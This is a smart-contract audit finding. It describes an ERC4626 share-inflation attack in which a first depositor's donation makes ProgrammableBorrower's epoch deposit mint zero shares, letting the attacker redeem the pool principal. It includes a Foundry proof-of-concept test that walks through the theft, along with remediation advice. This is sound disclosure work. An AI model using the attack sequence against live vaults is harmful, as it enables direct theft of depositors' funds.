### Title
Unprotected ERC4626 deposit lets an empty-vault user steal the epoch principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault whose `asset()` matches the CDO underlying and then deposits all idle pool assets without enforcing a minimum share amount. [1](#0-0) [2](#0-1) [3](#0-2)  On an empty vault susceptible to share-price inflation, a lender can mint the first share, donate assets to raise the share price, and cause the pool’s first deposit to mint zero shares. [4](#0-3)  The attacker can then redeem the initial share for both the donation and the pool deposit. [5](#0-4) 

### Finding Description
In the programmable/minted-interest mode, `IdleCDOEpochVariant.startEpoch` sends surplus underlying to the configured borrower and invokes the programmable-borrower start hook. [6](#0-5)  `onStartEpoch` snapshots `startAssets`, deposits the borrower’s whole underlying balance through `_depositToVault`, and activates epoch accounting. [2](#0-1)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but ignores the returned share count and has no `minShares` or zero-share check. [3](#0-2) 

With an empty ERC4626 vault that computes `shares = assets * totalSupply / totalAssets` without virtual-share protection, an attacker can deposit one wei to mint one share and directly transfer `D` assets into the vault. [2](#0-1)  The share price becomes approximately `D` assets, so when the borrower later deposits pool principal `P < D`, share issuance rounds down to zero. [3](#0-2)  The borrower records a principal baseline, but `_currentVaultAssets()` returns zero because the borrower received no vault shares. [7](#0-6) [4](#0-3) 

### Impact Explanation
The attacker recovers their donation plus the pool deposit by redeeming the single vault share, producing a direct theft of the pool principal. [3](#0-2) [4](#0-3)  For example, with `P = 1,000,000 USDC`, the attacker deposits `1` wei, donates `1,000,001 USDC`, causes the borrower’s `1,000,000 USDC` deposit to mint zero shares, and redeems one share for `2,000,001 USDC`. [2](#0-1) [3](#0-2)  The result is an approximately `1,000,000 USDC` vault loss and a broken solvency invariant: CDO strategy-token backing assumes principal exists, while the programmable borrower owns no corresponding ERC4626 claim. [7](#0-6) [8](#0-7) 

The loss can exceed this linearly because the attacker chooses the donation amount after observing the pool size, and normal epoch settlement only returns net interest through `totalInterestDueNow()` rather than automatically repairing principal loss. [9](#0-8) [7](#0-6) 

### Likelihood Explanation
The exploit requires the configured ERC4626 vault to be empty or effectively controlled by the attacker before the borrower first deposits, and to lack virtual-share or minimum-share protections. [1](#0-0) [2](#0-1)  Initialization validates only that `vault.asset()` equals the CDO underlying, so it does not exclude an empty or inflation-vulnerable vault. [10](#0-9)  The attacker transactions are ordinary unprivileged `deposit`, direct asset transfer, and `redeem` calls around the honest manager’s `startEpoch` call. [11](#0-10) [12](#0-11)  Existing skim logic does not protect this path because the donation is made to the ERC4626 vault, not directly to `IdleCDOEpochVariant`. [13](#0-12) [14](#0-13) 

### Recommendation
Require every vault deposit to return a nonzero, operator-bounded share amount by computing expected shares with `previewDeposit` and reverting when `shares == 0` or `shares < minShares`. [3](#0-2)  Prefer vaults with ERC4626 virtual assets/shares or an already initialized nontrivial supply, and enforce that policy during `initialize` and `setVault`. [1](#0-0) [15](#0-14)  Also revert when a deposit increases vault-held assets without increasing the borrower’s ERC4626 share balance, since that state cannot represent a redeemable claim. [3](#0-2) [4](#0-3) 

### Proof of Concept
This Foundry PoC models the transaction sequence against a standards-compliant ERC4626 vault without virtual-share protection whose `totalAssets` is its token balance.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "contracts/interfaces/IERC4626.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";

contract ProgrammableBorrowerShareInflationPoC is Test {
    // Fork fixture: real deployment values or a deployed unprotected ERC4626.
    IERC20Detailed underlying;
    IERC4626 vault;
    ProgrammableBorrower pb;
    IdleCDOEpochVariant cdo;
    address manager;
    address attacker = address(0xA11CE);

    function testEmptyVaultInflationStealsEpochPrincipal() public {
        uint256 poolPrincipal = 1_000_000e6;
        uint256 attackerDeposit = 1;
        uint256 donation = poolPrincipal + 1;

        deal(address(underlying), attacker, attackerDeposit + donation);
        deal(address(underlying), address(pb), poolPrincipal);

        // First-depositor inflation before the honest manager starts the epoch.
        vm.startPrank(attacker);
        underlying.approve(address(vault), attackerDeposit);
        uint256 attackerShares = vault.deposit(attackerDeposit, attacker);
        assertEq(attackerShares, 1);

        // The vault's totalAssets now exceeds the incoming pool deposit.
        underlying.transfer(address(vault), donation);
        vm.stopPrank();

        // Honest manager calls startEpoch; ProgrammableBorrower parks all cash.
        vm.prank(manager);
        cdo.startEpoch();

        // shares = 1_000_000e6 * 1 / 1_000_001e6 == 0.
        assertEq(vault.balanceOf(address(pb)), 0);
        assertEq(pb.totalUnderlying(), 0);

        // The single attacker share claims donation + stolen pool deposit.
        uint256 attackerBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares, attacker, attacker);

        assertEq(underlying.balanceOf(attacker) - attackerBefore, donation + poolPrincipal);
        assertEq(pb.totalUnderlying(), 0);
    }
}
```

The critical assertion is that `startEpoch` successfully deposits `poolPrincipal` while `vault.balanceOf(address(pb))` remains zero, transferring the redeemable claim to the attacker’s first share. [2](#0-1) [3](#0-2)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L325-334)
```text
  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-347)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L535-549)
```text
  /// @notice Return the total exposure in underlying terms (on-hand plus vault position).
  function totalUnderlying() external view returns (uint256) {
    return underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
  }

  /// @notice Return the current vault share balance held by this contract.
  function vaultSharesBalance() external view returns (uint256) {
    return vault.balanceOf(address(this));
  }

  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-244)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

    isEpochRunning = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L294-303)
```text
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```
